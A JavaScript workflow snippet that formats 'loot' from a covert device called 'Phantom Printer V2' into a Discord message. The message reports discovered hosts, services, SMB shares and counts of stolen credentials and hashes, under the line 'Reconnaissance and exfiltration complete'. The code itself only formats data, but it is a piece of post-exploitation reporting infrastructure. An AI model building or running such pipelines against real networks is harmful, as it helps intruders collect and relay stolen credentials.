// Process loot data and build Discord embed
const body = $input.first().json.body;

// Helper to safely get string and escape for JSON
function safeStr(val, maxLen = 1000) {
  if (!val) return 'None';
  let str = String(val);
  if (str.length > maxLen) {
    str = str.substring(0, maxLen) + '...';
  }
  return str;
}

// Get stats with defaults
const stats = body.stats || {};
const hostsCount = stats.hosts || 0;
const credsCount = stats.credentials || 0;
const hashesCount = stats.hashes || 0;

// Format hosts as comma-separated (cleaner for Discord)
let hostsStr = safeStr(body.hosts, 900);
// Replace any newlines with comma-space
hostsStr = hostsStr.replace(/\n/g, ', ').replace(/, $/, '');

// Format services
let servicesStr = safeStr(body.services, 900);
servicesStr = servicesStr.replace(/\n/g, ', ').replace(/, $/, '');

// Format SMB shares
let smbStr = safeStr(body.smb_shares, 500);
smbStr = smbStr.replace(/\n/g, ', ').replace(/, $/, '');

// Build the Discord embed object properly
const discordPayload = {
  embeds: [{
    title: 'üí∞ Phantom Printer - Loot Summary',
    description: 'Reconnaissance and exfiltration complete',
    color: 15844367,
    fields: [
      {
        name: 'üñ•Ô∏è Hosts Discovered',
        value: String(hostsCount),
        inline: true
      },
      {
        name: 'üîë Credentials',
        value: String(credsCount),
        inline: true
      },
      {
        name: 'üîê Hashes',
        value: String(hashesCount),
        inline: true
      },
      {
        name: 'üìã Discovered Hosts',
        value: hostsStr || 'None',
        inline: false
      },
      {
        name: 'üåê Common Services',
        value: servicesStr || 'None',
        inline: false
      },
      {
        name: 'üìÅ SMB Shares',
        value: smbStr || 'None',
        inline: false
      }
    ],
    timestamp: new Date().toISOString(),
    footer: {
      text: `Phantom Printer V2 | ${body.dropbox_id || 'Unknown'}`
    }
  }]
};

return { json: discordPayload };
